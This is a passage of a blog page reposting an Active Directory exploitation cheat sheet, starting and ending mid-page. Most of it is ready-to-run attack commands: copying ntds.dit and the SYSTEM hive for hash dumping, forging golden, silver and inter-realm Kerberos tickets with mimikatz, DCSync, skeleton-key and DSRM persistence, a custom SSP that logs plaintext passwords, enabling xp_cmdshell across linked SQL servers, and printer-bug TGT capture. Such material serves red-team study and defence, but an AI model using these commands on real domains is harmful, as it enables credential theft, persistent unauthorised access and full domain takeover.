</span></span><span class=line><span class=cl>set verbose on  
</span></span><span class=line><span class=cl>begin backup  
</span></span><span class=line><span class=cl>add volume c: alias mydrive  
</span></span><span class=line><span class=cl> 
</span></span><span class=line><span class=cl>create  
</span></span><span class=line><span class=cl>  
</span></span><span class=line><span class=cl>expose %mydrive% w:  
</span></span><span class=line><span class=cl>end backup  
</span></span><span class=line><span class=cl>}
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>#Execute diskshadow with our script as parameter
</span></span><span class=line><span class=cl>diskshadow /s script.txt</span></span></code></pre></div></div><ol start=2><li>Next we need to access the shadow copy, we may have the SeBackupPrivilege but we cant just
simply copy-paste ntds.dit, we need to mimic a backup software and use Win32 API calls to copy it on an accessible folder. For this we are
going to use <a href=https://github.com/giuliano108/SeBackupPrivilege target=_blank rel=noreferrer>this</a> amazing repo:</li></ol><div class=highlight-wrapper><div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>#Importing both dlls from the repo using powershell
</span></span><span class=line><span class=cl>Import-Module .\SeBackupPrivilegeCmdLets.dll
</span></span><span class=line><span class=cl>Import-Module .\SeBackupPrivilegeUtils.dll
</span></span><span class=line><span class=cl>  
</span></span><span class=line><span class=cl>#Checking if the SeBackupPrivilege is enabled
</span></span><span class=line><span class=cl>Get-SeBackupPrivilege
</span></span><span class=line><span class=cl>  
</span></span><span class=line><span class=cl>#If it isn&#39;t we enable it
</span></span><span class=line><span class=cl>Set-SeBackupPrivilege
</span></span><span class=line><span class=cl>  
</span></span><span class=line><span class=cl>#Use the functionality of the dlls to copy the ntds.dit database file from the shadow copy to a location of our choice
</span></span><span class=line><span class=cl>Copy-FileSeBackupPrivilege w:\windows\NTDS\ntds.dit c:\&lt;PathToSave&gt;\ntds.dit -Overwrite
</span></span><span class=line><span class=cl>  
</span></span><span class=line><span class=cl>#Dump the SYSTEM hive
</span></span><span class=line><span class=cl>reg save HKLM\SYSTEM c:\temp\system.hive </span></span></code></pre></div></div><ol start=3><li>Using smbclient.py from impacket or some other tool we copy ntds.dit and the SYSTEM hive on our local machine.</li><li>Use secretsdump.py from impacket and dump the hashes.</li><li>Use psexec or another tool of your choice to PTH and get Domain Admin access.</li></ol><h3 class="relative group">Abusing Exchange<div id=abusing-exchange class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"><a class="text-primary-300 dark:text-neutral-700 !no-underline" href=#abusing-exchange aria-label=Anchor>#</a></span></h3><ul><li><a href=https://dirkjanm.io/abusing-exchange-one-api-call-away-from-domain-admin/ target=_blank rel=noreferrer>Abusing Exchange one Api call from DA</a></li><li><a href=https://www.zerodayinitiative.com/blog/2020/2/24/cve-2020-0688-remote-code-execution-on-microsoft-exchange-server-through-fixed-cryptographic-keys target=_blank rel=noreferrer>CVE-2020-0688</a></li><li><a href=https://github.com/dirkjanm/PrivExchange target=_blank rel=noreferrer>PrivExchange</a> Exchange your privileges for Domain Admin privs by abusing Exchange</li></ul><h3 class="relative group">Weaponizing Printer Bug<div id=weaponizing-printer-bug class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"><a class="text-primary-300 dark:text-neutral-700 !no-underline" href=#weaponizing-printer-bug aria-label=Anchor>#</a></span></h3><ul><li><a href=https://www.dionach.com/blog/printer-server-bug-to-domain-administrator/ target=_blank rel=noreferrer>Printer Server Bug to Domain Administrator</a></li><li><a href=https://github.com/NotMedic/NetNTLMtoSilverTicket target=_blank rel=noreferrer>NetNTLMtoSilverTicket</a></li></ul><h3 class="relative group">Abusing ACLs<div id=abusing-acls class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"><a class="text-primary-300 dark:text-neutral-700 !no-underline" href=#abusing-acls aria-label=Anchor>#</a></span></h3><ul><li><a href=https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/ target=_blank rel=noreferrer>Escalating privileges with ACLs in Active Directory</a></li><li><a href=https://github.com/fox-it/aclpwn.py target=_blank rel=noreferrer>aclpwn.py</a></li><li><a href=https://github.com/fox-it/Invoke-ACLPwn target=_blank rel=noreferrer>Invoke-ACLPwn</a></li></ul><h3 class="relative group">Abusing IPv6 with mitm6<div id=abusing-ipv6-with-mitm6 class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"><a class="text-primary-300 dark:text-neutral-700 !no-underline" href=#abusing-ipv6-with-mitm6 aria-label=Anchor>#</a></span></h3><ul><li><a href=https://blog.fox-it.com/2018/01/11/mitm6-compromising-ipv4-networks-via-ipv6/ target=_blank rel=noreferrer>Compromising IPv4 networks via IPv6</a></li><li><a href=https://github.com/fox-it/mitm6 target=_blank rel=noreferrer>mitm6</a></li></ul><h3 class="relative group">SID History Abuse<div id=sid-history-abuse class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"><a class="text-primary-300 dark:text-neutral-700 !no-underline" href=#sid-history-abuse aria-label=Anchor>#</a></span></h3><p><em>WUT IS DIS?: If we manage to compromise a child domain of a forest and <a href=https://www.itprotoday.com/windows-8/sid-filtering target=_blank rel=noreferrer>SID filtering</a> isn&rsquo;t enabled (most of the times is not), we can abuse it to privilege escalate to Domain Administrator of the root domain of the forest. This is possible because of the <a href=https://www.itprotoday.com/windows-8/sid-history target=_blank rel=noreferrer>SID History</a> field on a kerberos TGT ticket, that defines the &ldquo;extra&rdquo; security groups and privileges.</em></p><p>Exploitation example:</p><div class=highlight-wrapper><div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>#Get the SID of the Current Domain using PowerView
</span></span><span class=line><span class=cl>Get-DomainSID -Domain current.root.domain.local
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>#Get the SID of the Root Domain using PowerView
</span></span><span class=line><span class=cl>Get-DomainSID -Domain root.domain.local
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>#Create the Enteprise Admins SID
</span></span><span class=line><span class=cl>Format: RootDomainSID-519
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>#Forge &#34;Extra&#34; Golden Ticket using mimikatz
</span></span><span class=line><span class=cl>kerberos::golden /user:Administrator /domain:current.root.domain.local /sid:&lt;CurrentDomainSID&gt; /krbtgt:&lt;krbtgtHash&gt; /sids:&lt;EnterpriseAdminsSID&gt; /startoffset:0 /endin:600 /renewmax:10080 /ticket:\path\to\ticket\golden.kirbi
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>#Inject the ticket into memory
</span></span><span class=line><span class=cl>kerberos::ptt \path\to\ticket\golden.kirbi
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>#List the DC of the Root Domain
</span></span><span class=line><span class=cl>dir \\dc.root.domain.local\C$
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>#Or DCsync and dump the hashes using mimikatz
</span></span><span class=line><span class=cl>lsadump::dcsync /domain:root.domain.local /all</span></span></code></pre></div></div><p>Detailed Articles:</p><ul><li><a href="https://adsecurity.org/?p=1640" target=_blank rel=noreferrer>Kerberos Golden Tickets are Now More Golden</a></li><li><a href=http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/ target=_blank rel=noreferrer>A Guide to Attacking Domain Trusts</a></li></ul><h3 class="relative group">Exploiting SharePoint<div id=exploiting-sharepoint class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"><a class="text-primary-300 dark:text-neutral-700 !no-underline" href=#exploiting-sharepoint aria-label=Anchor>#</a></span></h3><ul><li><a href=https://medium.com/@gorkemkaradeniz/sharepoint-cve-2019-0604-rce-exploitation-ab3056623b7d target=_blank rel=noreferrer>CVE-2019-0604</a> RCE Exploitation<br><a href=https://github.com/k8gege/CVE-2019-0604 target=_blank rel=noreferrer>PoC</a></li><li><a href=https://www.zerodayinitiative.com/blog/2019/9/18/cve-2019-1257-code-execution-on-microsoft-sharepoint-through-bdc-deserialization target=_blank rel=noreferrer>CVE-2019-1257</a> Code execution through BDC deserialization</li><li><a href=https://www.zerodayinitiative.com/blog/2020/4/28/cve-2020-0932-remote-code-execution-on-microsoft-sharepoint-using-typeconverters target=_blank rel=noreferrer>CVE-2020-0932</a> RCE using typeconverters<br><a href=https://github.com/thezdi/PoC/tree/master/CVE-2020-0932 target=_blank rel=noreferrer>PoC</a></li></ul><h3 class="relative group">Zerologon Exploit<div id=zerologon-exploit class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"><a class="text-primary-300 dark:text-neutral-700 !no-underline" href=#zerologon-exploit aria-label=Anchor>#</a></span></h3><ul><li><a href="https://www.secura.com/pathtoimg.php?id=2055" target=_blank rel=noreferrer>Zerologon: Unauthenticated domain controller compromise</a>: White paper of the vulnerability.</li><li><a href=https://github.com/nccgroup/nccfsas/tree/main/Tools/SharpZeroLogon target=_blank rel=noreferrer>SharpZeroLogon</a>: C# implementation of the Zerologon exploit.</li><li><a href=https://github.com/BC-SECURITY/Invoke-ZeroLogon target=_blank rel=noreferrer>Invoke-ZeroLogon</a>: Powershell implementation of the Zerologon exploit.</li><li><a href=https://github.com/bb00/zer0dump target=_blank rel=noreferrer>Zer0Dump</a>: Python implementation of the Zerologon exploit using the impacket library.</li></ul><h2 class="relative group">Domain Persistence<div id=domain-persistence class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"><a class="text-primary-300 dark:text-neutral-700 !no-underline" href=#domain-persistence aria-label=Anchor>#</a></span></h2><h3 class="relative group">Golden Ticket Attack<div id=golden-ticket-attack class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"><a class="text-primary-300 dark:text-neutral-700 !no-underline" href=#golden-ticket-attack aria-label=Anchor>#</a></span></h3><div class=highlight-wrapper><div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>#Execute mimikatz on DC as DA to grab krbtgt hash:
</span></span><span class=line><span class=cl>Invoke-Mimikatz -Command &#39;&#34;lsadump::lsa /patch&#34;&#39; -ComputerName &lt;DC&#39;sName&gt;
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>#On any machine:
</span></span><span class=line><span class=cl>Invoke-Mimikatz -Command &#39;&#34;kerberos::golden /user:Administrator /domain:&lt;DomainName&gt; /sid:&lt;Domain&#39;s SID&gt; /krbtgt:
</span></span><span class=line><span class=cl>&lt;HashOfkrbtgtAccount&gt;   id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt&#34;&#39;</span></span></code></pre></div></div><h3 class="relative group">DCsync Attack<div id=dcsync-attack class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"><a class="text-primary-300 dark:text-neutral-700 !no-underline" href=#dcsync-attack aria-label=Anchor>#</a></span></h3><div class=highlight-wrapper><div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>#DCsync using mimikatz (You need DA rights or DS-Replication-Get-Changes and DS-Replication-Get-Changes-All privileges):
</span></span><span class=line><span class=cl>Invoke-Mimikatz -Command &#39;&#34;lsadump::dcsync /user:&lt;DomainName&gt;\&lt;AnyDomainUser&gt;&#34;&#39;
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>#DCsync using secretsdump.py from impacket with NTLM authentication
</span></span><span class=line><span class=cl>secretsdump.py &lt;Domain&gt;/&lt;Username&gt;:&lt;Password&gt;@&lt;DC&#39;S IP or FQDN&gt; -just-dc-ntlm
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>#DCsync using secretsdump.py from impacket with Kerberos Authentication
</span></span><span class=line><span class=cl>secretsdump.py -no-pass -k &lt;Domain&gt;/&lt;Username&gt;@&lt;DC&#39;S IP or FQDN&gt; -just-dc-ntlm</span></span></code></pre></div></div><p><strong>Tip:</strong><br>/ptt -> inject ticket on current running session<br>/ticket -> save the ticket on the system for later use</p><h3 class="relative group">Silver Ticket Attack<div id=silver-ticket-attack class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"><a class="text-primary-300 dark:text-neutral-700 !no-underline" href=#silver-ticket-attack aria-label=Anchor>#</a></span></h3><div class=highlight-wrapper><div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>Invoke-Mimikatz -Command &#39;&#34;kerberos::golden /domain:&lt;DomainName&gt; /sid:&lt;DomainSID&gt; /target:&lt;TheTargetMachine&gt; /service:
</span></span><span class=line><span class=cl>&lt;ServiceType&gt; /rc4:&lt;TheSPN&#39;s Account NTLM Hash&gt; /user:&lt;UserToImpersonate&gt; /ptt&#34;&#39;</span></span></code></pre></div></div><p><a href="https://adsecurity.org/?page_id=183" target=_blank rel=noreferrer>SPN List</a></p><h3 class="relative group">Skeleton Key Attack<div id=skeleton-key-attack class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"><a class="text-primary-300 dark:text-neutral-700 !no-underline" href=#skeleton-key-attack aria-label=Anchor>#</a></span></h3><div class=highlight-wrapper><div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>#Exploitation Command runned as DA:
</span></span><span class=line><span class=cl>Invoke-Mimikatz -Command &#39;&#34;privilege::debug&#34; &#34;misc::skeleton&#34;&#39; -ComputerName &lt;DC&#39;s FQDN&gt;
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>#Access using the password &#34;mimikatz&#34;
</span></span><span class=line><span class=cl>Enter-PSSession -ComputerName &lt;AnyMachineYouLike&gt; -Credential &lt;Domain&gt;\Administrator</span></span></code></pre></div></div><h3 class="relative group">DSRM Abuse<div id=dsrm-abuse class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"><a class="text-primary-300 dark:text-neutral-700 !no-underline" href=#dsrm-abuse aria-label=Anchor>#</a></span></h3><p><em>WUT IS DIS?: Every DC has a local Administrator account, this accounts has the DSRM password which is a SafeBackupPassword. We can get this and then pth its NTLM hash to get local Administrator access to DC!</em></p><div class=highlight-wrapper><div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>#Dump DSRM password (needs DA privs):
</span></span><span class=line><span class=cl>Invoke-Mimikatz -Command &#39;&#34;token::elevate&#34; &#34;lsadump::sam&#34;&#39; -ComputerName &lt;DC&#39;s Name&gt;
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>#This is a local account, so we can PTH and authenticate!
</span></span><span class=line><span class=cl>#BUT we need to alter the behaviour of the DSRM account before pth:
</span></span><span class=line><span class=cl>#Connect on DC:
</span></span><span class=line><span class=cl>Enter-PSSession -ComputerName &lt;DC&#39;s Name&gt;
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>#Alter the Logon behaviour on registry:
</span></span><span class=line><span class=cl>New-ItemProperty &#34;HKLM:\System\CurrentControlSet\Control\Lsa\&#34; -Name &#34;DsrmAdminLogonBehaviour&#34; -Value 2 -PropertyType DWORD -Verbose
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>#If the property already exists:
</span></span><span class=line><span class=cl>Set-ItemProperty &#34;HKLM:\System\CurrentControlSet\Control\Lsa\&#34; -Name &#34;DsrmAdminLogonBehaviour&#34; -Value 2 -Verbose</span></span></code></pre></div></div><p>Then just PTH to get local admin access on DC!</p><h3 class="relative group">Custom SSP<div id=custom-ssp class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"><a class="text-primary-300 dark:text-neutral-700 !no-underline" href=#custom-ssp aria-label=Anchor>#</a></span></h3><p><em>WUT IS DIS?: We can set our on SSP by dropping a custom dll, for example mimilib.dll from mimikatz, that will monitor and capture plaintext passwords from users that logged on!</em></p><p>From powershell:</p><div class=highlight-wrapper><div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>#Get current Security Package:
</span></span><span class=line><span class=cl>$packages = Get-ItemProperty &#34;HKLM:\System\CurrentControlSet\Control\Lsa\OSConfig\&#34; -Name &#39;Security Packages&#39; | select -ExpandProperty  &#39;Security Packages&#39;
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>#Append mimilib:
</span></span><span class=line><span class=cl>$packages += &#34;mimilib&#34;
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>#Change the new packages name
</span></span><span class=line><span class=cl>Set-ItemProperty &#34;HKLM:\System\CurrentControlSet\Control\Lsa\OSConfig\&#34; -Name &#39;Security Packages&#39; -Value $packages
</span></span><span class=line><span class=cl>Set-ItemProperty &#34;HKLM:\System\CurrentControlSet\Control\Lsa\&#34; -Name &#39;Security Packages&#39; -Value $packages
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>#ALTERNATIVE:
</span></span><span class=line><span class=cl>Invoke-Mimikatz -Command &#39;&#34;misc::memssp&#34;&#39;</span></span></code></pre></div></div><p>Now all logons on the DC are logged to -> C:\Windows\System32\kiwissp.log</p><h2 class="relative group">Cross Forest Attacks<div id=cross-forest-attacks class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"><a class="text-primary-300 dark:text-neutral-700 !no-underline" href=#cross-forest-attacks aria-label=Anchor>#</a></span></h2><h3 class="relative group">Trust Tickets<div id=trust-tickets class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"><a class="text-primary-300 dark:text-neutral-700 !no-underline" href=#trust-tickets aria-label=Anchor>#</a></span></h3><p><em>WUT IS DIS ?: If we have Domain Admin rights on a Domain that has Bidirectional Trust relationship with an other forest we can get the Trust key and forge our own inter-realm TGT.</em></p><p>&#9888;&#xfe0f; The access we will have will be limited to what our DA account is configured to have on the other Forest!</p><p>Using Mimikatz:</p><div class=highlight-wrapper><div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>#Dump the trust key
</span></span><span class=line><span class=cl>Invoke-Mimikatz -Command &#39;&#34;lsadump::trust /patch&#34;&#39;
</span></span><span class=line><span class=cl>Invoke-Mimikatz -Command &#39;&#34;lsadump::lsa /patch&#34;&#39;
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>#Forge an inter-realm TGT using the Golden Ticket attack
</span></span><span class=line><span class=cl>Invoke-Mimikatz -Command &#39;&#34;kerberos::golden /user:Administrator /domain:&lt;OurDomain&gt; /sid:  
</span></span><span class=line><span class=cl>&lt;OurDomainSID&gt; /rc4:&lt;TrustKey&gt; /service:krbtgt /target:&lt;TheTargetDomain&gt; /ticket:
</span></span><span class=line><span class=cl>&lt;PathToSaveTheGoldenTicket&gt;&#34;&#39;</span></span></code></pre></div></div><p>&#x2757; Tickets -> .kirbi format</p><p>Then Ask for a TGS to the external Forest for any service using the inter-realm TGT and access the resource!</p><p>Using Rubeus:</p><div class=highlight-wrapper><div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>.\Rubeus.exe asktgs /ticket:&lt;kirbi file&gt; /service:&#34;Service&#39;s SPN&#34; /ptt</span></span></code></pre></div></div><h3 class="relative group">Abuse MSSQL Servers<div id=abuse-mssql-servers class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"><a class="text-primary-300 dark:text-neutral-700 !no-underline" href=#abuse-mssql-servers aria-label=Anchor>#</a></span></h3><ul><li>Enumerate MSSQL Instances: <code>Get-SQLInstanceDomain</code></li><li>Check Accessibility as current user:</li></ul><div class=highlight-wrapper><div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>Get-SQLConnectionTestThreaded
</span></span><span class=line><span class=cl>Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -Verbose</span></span></code></pre></div></div><ul><li>Gather Information about the instance: <code>Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose</code></li><li>Abusing SQL Database Links:<br><em>WUT IS DIS?: A database link allows a SQL Server to access other resources like other SQL Server. If we have two linked SQL Servers we can execute stored procedures in them. Database links also works across Forest Trust!</em></li></ul><p>Check for existing Database Links:</p><div class=highlight-wrapper><div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>#Check for existing Database Links:
</span></span><span class=line><span class=cl>#PowerUpSQL:
</span></span><span class=line><span class=cl>Get-SQLServerLink -Instace &lt;SPN&gt; -Verbose
</span></span><span class=line><span class=cl>     
</span></span><span class=line><span class=cl>#MSSQL Query:
</span></span><span class=line><span class=cl>select * from master..sysservers</span></span></code></pre></div></div><p>Then we can use queries to enumerate other links from the linked Database:</p><div class=highlight-wrapper><div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>#Manualy:
</span></span><span class=line><span class=cl>select * from openquery(&#34;LinkedDatabase&#34;, &#39;select * from master..sysservers&#39;)
</span></span><span class=line><span class=cl>     
</span></span><span class=line><span class=cl>#PowerUpSQL (Will Enum every link across Forests and Child Domain of the Forests):
</span></span><span class=line><span class=cl>Get-SQLServerLinkCrawl -Instance &lt;SPN&gt; -Verbose
</span></span><span class=line><span class=cl>     
</span></span><span class=line><span class=cl>#Then we can execute command on the machine&#39;s were the SQL Service runs using xp_cmdshell
</span></span><span class=line><span class=cl>#Or if it is disabled enable it:
</span></span><span class=line><span class=cl>EXECUTE(&#39;sp_configure &#34;xp_cmdshell&#34;,1;reconfigure;&#39;) AT &#34;SPN&#34;</span></span></code></pre></div></div><p>Query execution:</p><div class=highlight-wrapper><div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>Get-SQLServerLinkCrawl -Instace &lt;SPN&gt; -Query &#34;exec master..xp_cmdshell &#39;whoami&#39;&#34;</span></span></code></pre></div></div><h3 class="relative group">Breaking Forest Trusts<div id=breaking-forest-trusts class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"><a class="text-primary-300 dark:text-neutral-700 !no-underline" href=#breaking-forest-trusts aria-label=Anchor>#</a></span></h3><p><em>WUT IS DIS?:<br>TL;DR<br>If we have a bidirectional trust with an external forest and we manage to compromise a machine on the local forest that has enabled unconstrained delegation (DCs have this by default), we can use the printerbug to force the DC of the external forest&rsquo;s root domain to authenticate to us. Then we can capture it&rsquo;s TGT, inject it into memory and DCsync to dump it&rsquo;s hashes, giving ous complete access over the whole forest.</em></p><p>Tools we are going to use:</p><ul><li><a href=https://github.com/GhostPack/Rubeus target=_blank rel=noreferrer>Rubeus</a></li><li><a href=https://github.com/leechristensen/SpoolSample target=_blank rel=noreferrer>SpoolSample</a></li><li><a href=https://github.com/gentilkiwi/mimikatz target=_blank rel=noreferrer>Mimikatz</a></li></ul><p>Exploitation example:</p><div class=highlight-wrapper><div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>#Start monitoring for TGTs with rubeus:
</span></span><span class=line><span class=cl>Rubeus.exe monitor /interval:5 /filteruser:target-dc$
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>#Execute the printerbug to trigger the force authentication of the target DC to our machine
</span></span><span class=line><span class=cl>SpoolSample.exe target-dc$.external.forest.local dc.compromised.domain.local
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>#Get the base64 captured TGT from Rubeus and inject it into memory:
</span></span><span class=line><span class=cl>Rubeus.exe ptt /ticket:&lt;Base64ValueofCapturedTicket&gt;
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>#Dump the hashes of the target domain using mimikatz:
</span></span><span class=line><span class=cl>lsadump::dcsync /domain:external.forest.local /all </span></span></code></pre></div></div><p>Detailed Articles:</p><ul><li><a href=https://www.harmj0y.net/blog/redteaming/not-a-security-boundary-breaking-forest-trusts/ target=_blank rel=noreferrer>Not A Security Boundary: Breaking Forest Trusts</a></li><li><a href=https://posts.specterops.io/hunting-in-active-directory-unconstrained-delegation-forests-trusts-71f2b33688e1 target=_blank rel=noreferrer>Hunting in Active Directory: Unconstrained Delegation & Forests Trusts</a></li></ul><blockquote><p>Source: <a href=https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet/blob/master/README.md target=_blank rel=noreferrer>GitHub</a></p></blockquote><div class="not-prose my-6 print:hidden"><div class=ad-container><ins class=adsbygoogle style=display:block data-ad-client=ca-pub-3526678290068011 data-ad-slot=7160066188 data-ad-format=auto data-full-width-responsive=true></ins><script>(adsbygoogle=window.adsbygoogle||[]).push({})</script></div></div></div><h2 class="mt-8 text-2xl font-extrabold mb-10">Related</h2><section class="w-full grid gap-4 sm:grid-cols-2 md:grid-cols-3"><article class="article-link--related relative min-h-full min-w-full overflow-hidden rounded-lg border border-neutral-300 dark:border-neutral-600"><div class="flex-none relative overflow-hidden thumbnail_card_related"><img src=/img/blog_hu_be59c7de05deaafc.png role=presentation loading=lazy decoding=async fetchpriority=low class="not-prose absolute inset-0 w-full h-full object-cover"></div><div class=p-4><header><a href=/post/notes-stego/ class="not-prose before:absolute before:inset-0 decoration-primary-500 dark:text-neutral text-xl font-bold text-neutral-800 hover:underline hover:underline-offset-2"><h2>Notes Stego</h2></a></header><div class="text-sm text-neutral-500 dark:text-neutral-400"><div class="flex flex-row flex-wrap items-center"><time datetime=2021-04-21T17:47:23+05:30>21 April 2021</time><span class="px-2 text-primary-500">&#183;</span><span>812 words</span><span class="px-2 text-primary-500">&#183;</span><span title="Reading time">4 mins</span></div><div class="flex flex-row flex-wrap items-center"><a class="relative mt-[0.5rem] me-2" href=/categories/classroom/><span class="flex cursor-pointer"><span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">Classroom
</span></span></a><a class="relative mt-[0.5rem] me-2" href=/tags/notes/><span class="flex cursor-pointer"><span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">Notes
</span></span></a><a class="relative mt-[0.5rem] me-2" href=/tags/stego/><span class="flex cursor-pointer"><span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">Stego</span></span></a></div></div><div class="article-link__summary prose dark:prose-invert mt-1 line-clamp-5"></div></div><div class="px-6 pt-4 pb-2"></div></article><article class="article-link--related relative min-h-full min-w-full overflow-hidden rounded-lg border border-neutral-300 dark:border-neutral-600"><div class="flex-none relative overflow-hidden thumbnail_card_related"><img src=/img/blog_hu_be59c7de05deaafc.png role=presentation loading=lazy decoding=async fetchpriority=low class="not-prose absolute inset-0 w-full h-full object-cover"></div><div class=p-4><header><a href=/post/notes-osimodel-explained/ class="not-prose before:absolute before:inset-0 decoration-primary-500 dark:text-neutral text-xl font-bold text-neutral-800 hover:underline hover:underline-offset-2"><h2>Notes OSIModel Explained</h2></a></header><div class="text-sm text-neutral-500 dark:text-neutral-400"><div class="flex flex-row flex-wrap items-center"><time datetime=2021-04-25T20:20:59+05:30>25 April 2021</time><span class="px-2 text-primary-500">&#183;</span><span>252 words</span><span class="px-2 text-primary-500">&#183;</span><span title="Reading time">2 mins</span></div><div class="flex flex-row flex-wrap items-center"><a class="relative mt-[0.5rem] me-2" href=/categories/classroom/><span class="flex cursor-pointer"><span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">Classroom
</span></span></a><a class="relative mt-[0.5rem] me-2" href=/tags/notes/><span class="flex cursor-pointer"><span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">Notes
</span></span></a><a class="relative mt-[0.5rem] me-2" href=/tags/osi-model/><span class="flex cursor-pointer"><span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">OSI Model
</span></span></a><a class="relative mt-[0.5rem] me-2" href=/tags/wireshark/><span class="flex cursor-pointer"><span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">Wireshark</span></span></a></div></div><div class="article-link__summary prose dark:prose-invert mt-1 line-clamp-5"></div></div><div class="px-6 pt-4 pb-2"></div></article><article class="article-link--related relative min-h-full min-w-full overflow-hidden rounded-lg border border-neutral-300 dark:border-neutral-600"><div class="flex-none relative overflow-hidden thumbnail_card_related"><img src=/img/blog_hu_be59c7de05deaafc.png role=presentation loading=lazy decoding=async fetchpriority=low class="not-prose absolute inset-0 w-full h-full object-cover"></div><div class=p-4><header><a href=/post/notes-osimodel/ class="not-prose before:absolute before:inset-0 decoration-primary-500 dark:text-neutral text-xl font-bold text-neutral-800 hover:underline hover:underline-offset-2"><h2>Notes OSIModel</h2></a></header><div class="text-sm text-neutral-500 dark:text-neutral-400"><div class="flex flex-row flex-wrap items-center"><time datetime=2021-04-21T20:01:52+05:30>21 April 2021</time><span class="px-2 text-primary-500">&#183;</span><span>1021 words</span><span class="px-2 text-primary-500">&#183;</span><span title="Reading time">5 mins</span></div><div class="flex flex-row flex-wrap items-center"><a class="relative mt-[0.5rem] me-2" href=/categories/classroom/><span class="flex cursor-pointer"><span class="rounded-md border 